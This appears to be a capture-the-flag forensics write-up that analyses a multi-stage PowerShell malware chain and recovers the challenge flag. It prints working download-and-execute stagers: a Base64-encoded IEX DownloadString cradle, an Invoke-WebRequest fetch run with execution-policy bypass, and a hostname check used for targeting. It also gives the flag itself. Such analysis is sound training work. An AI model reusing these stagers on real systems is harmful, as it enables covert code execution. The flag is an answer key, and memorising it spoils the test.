# Solution

## Challenge Overview
A forensic challenge involving a multi-stage PowerShell attack related to Thorin's stolen clockwork amulet.

## Approach

### Initial Script Analysis
1. Examined the first PowerShell script with a specific workstation check
2. Decoded the Base64 encoded command revealing a download mechanism
3. Identified a pattern of staged malware delivery

### Payload Retrieval
- Used netcat to connect to the provided Docker instance
- Sent HTTP GET requests to different endpoints:
  1. `/update`: First stage payload
```
    function qt4PO { 
        if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") { exit } 
        powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=" 
    } 
    qt4PO
```
  2. `/a541a`: Second stage payload with a custom authentication header
    ```
        function aqFVaq {
        Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
        powershell.exe -exec Bypass -File "a541a.ps1"
    }
    aqFVaq
    ```
    3. Third Stage Payload
    ```
        $a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
        ($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""

    ```
    4. HEX string analysis
    - Hex String: 4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d
    - Decoded Flag: HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
### HTTP Requests
```
    GET /update HTTP/1.1
    Host: korp.htb

    GET /a541a HTTP/1.1
    Host: korp.htb
    X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d
```
### Flag Extraction
- Found a hex-encoded string in the final payload
- Used PowerShell-like decoding technique to convert hex to ASCII
- Successfully decoded the flag: `HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`

## Key Findings
- Multi-stage fileless malware attack
- Use of Base64 encoding and hex obfuscation
- Targeted attack with specific workstation check

## Flag
`HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`